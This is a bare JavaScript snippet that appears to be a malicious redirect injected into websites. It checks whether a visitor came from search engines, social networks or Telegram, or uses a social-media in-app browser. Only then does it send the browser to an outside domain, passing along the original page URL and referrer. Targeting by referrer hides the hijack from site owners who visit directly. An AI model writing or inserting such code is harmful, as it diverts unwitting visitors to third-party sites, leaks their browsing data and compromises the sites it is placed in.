var ars = 'https://goldfieldupc.com';
if(['.google.', '.bing.', '.yandex.', 'facebook.', 'pinterest.', 'baidu.', 'petalsearch.', 'startpage.', 'xfinity.', 'alohafind.', 'yahoo.', 'duckduckgo.', 'searchbip.', 'wowway.', 't.', 'telegram.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
